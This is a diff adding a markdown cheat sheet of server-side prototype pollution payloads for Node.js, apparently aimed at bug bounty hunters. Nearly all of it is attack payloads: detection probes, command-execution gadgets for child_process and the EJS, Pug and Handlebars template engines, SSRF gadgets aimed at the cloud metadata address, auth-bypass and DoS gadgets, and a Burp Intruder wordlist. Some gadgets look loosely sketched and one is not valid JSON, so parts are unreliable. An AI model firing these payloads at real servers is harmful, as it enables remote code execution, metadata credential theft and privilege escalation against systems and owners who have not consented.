@@ -1,0 +1,124 @@
+# Server-Side Prototype Pollution Payloads
+
+Server-side pollution (from JSON bodies / headers parsed into objects) can lead to RCE, SSRF, and auth bypass.
+
+## STEP 1 — DETECT (the endpoint must deep-merge your JSON)
+Send in JSON body / POST / PUT endpoints that store & echo data:
+```json
+{"__proto__":{"polluted":"clean"}}
+{"constructor":{"prototype":{"polluted":"clean"}}}
+{"__proto__":{"__proto__":{"polluted":"clean"}}}
+{"a":{"__proto__":{"__proto__":{"polluted":"clean"}}}}
+```
+Then query a neutral endpoint that returns an object with defaults:
+```
+GET /?x=1&__proto__[polluted]=clean
+```
+Markers:
+- Response contains `"polluted":"clean"` on another unrelated object
+- Errors change (JSON parse error vs normal)
+- New header/body property appears that wasn't added by code
+
+Trick for detection without breaking the whole req: use an "obvious" property and observe:
+```
+{"__proto__":{"status":"polluted"}}
+```
+
+## STEP 2 — RCE GADGETS
+
+### Node child_process (execShell, shell)
+Pollute options the server passes to exec:
+```json
+{"__proto__":{"shell":"/proc/self/exe"}}
+{"__proto__":{"argv0":"console.log(require('child_process').execSync('id').toString())//"}}
+{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ"}}
+```
+
+### EJS RCE chain (template engine render with pollution)
+```json
+{"__proto__":{"client":true,"escapeFunction":"1; return global.process.mainModule.require('child_process').execSync('id').toString()"}}
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');x"}}
+{"__proto__":{"settings":{"view options":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}}}
+```
+
+### Pug RCE
+```json
+{"__proto__":{"type":"Block","nodes":"","selfClosing":true}}
+```
+(needs a pug compile path, e.g. debug output)
+
+### Handlebars RCE
+Pollute `type` on the `Object` template → code execution in helper invocation (PortSwigger research):
+```json
+{"__proto__":{"type":"Program","body":[],"constructor":{"prototype":{"type":"MustacheStatement"}}}}
+```
+
+## STEP 3 — SSRF GADGET
+Pollute host/port the server uses when making outbound calls:
+```json
+{"__proto__":{"host":"127.0.0.1"}}
+{"__proto__":{"hostname":"127.0.0.1"}}
+{"__proto__":{"port":"8080"}}
+{"__proto__":{"href":"http://169.254.169.254/"}}
+{"__proto__":{"url":"http://169.254.169.254/latest/meta-data/"}}
+{"__proto__":{"uri":"http://127.0.0.1:9200/"}}
+{"__proto__":{"pathname":"/admin"}}
+```
+Then trigger the app to make an outbound fetch/undici/axios request with default options → it now hits your target.
+
+## STEP 4 — AUTH BYPASS GADGETS
+### Validation bypass (joi/express-validator style)
+```json
+{"__proto__":{"allowUnknown":true}}
+{"__proto__":{"required":false}}
+{"__proto__":{"stripUnknown":true}}
+```
+### Query/ORM polution (sequelize where)
+```json
+{"__proto__":{"where":{"id":1}}}
+{"__proto__":{"include":[{"all":true}]}}
+{"__proto__":{"attributes":["*"]}}
+```
+### Cookie / headers pollution
+```json
+{"__proto__":{"cookie":"admin=1"}}
+{"__proto__":{"host":"internal-admin"}}
+```
+
+## STEP 5 — DoS GADGETS
+```json
+{"__proto__":{"polluted":"x"}}
+{"__proto__":{"toString":"x"}}
+{"__proto__":{"valueOf":"x"}}
+{"__proto__":{"length":1000000000}}
+{"__proto__":{"maxObjects":Infinity}}
+{"__proto__":{"maxListeners":2000}}
+```
+
+## STEP 6 — REAL WORLD SHORTCUTS
+The two best real bounty chains:
+1. **Express + `qs` + `deepmerge`**: `?__proto__[role]=admin` on profile update → becomes global admin in session on next read. Test every update/login endpoint.
+2. **JSON body → `_.defaultsDeep(ctx, defaultConfig)`** in middlewares → pollute config values the code later uses (`redirect_uri`, `callback`, `innerHTML`).
+
+## Burp Intruder master wordlist
+```
+{"__proto__":{"x":1}}
+{"constructor":{"prototype":{"x":1}}}
+{"__proto__":{"shell":"/proc/self/exe"}}
+{"__proto__":{"argv0":"x"}}
+{"__proto__":{"NODE_OPTIONS":"--inspect 0.0.0.0"}}
+{"__proto__":{"type":"Program","body":[]}}
+{"__proto__":{"client":true,"escapeFunction":"return 1"}}
+{"__proto__":{"outputFunctionName":"x=1;y"}}
+{"__proto__":{"host":"127.0.0.1"}}
+{"__proto__":{"port":"80"}}
+{"__proto__":{"url":"http://169.254.169.254"}}
+{"__proto__":{"allowUnknown":true}}
+{"__proto__":{"all":true}}
+{"__proto__":{"include":[{"all":true}]}}
+{"__proto__":{"attributes":["*"]}}
+{"__proto__":{"status":200}}
+{"__proto__":{"statusCode":200}}
+{"__proto__":{"length":999999}}
+```
+Bear in mind many bug bounty programs categorize pure PP-DoS as low; PP→XSS and PP→RCE are the high-impact findings to chase.
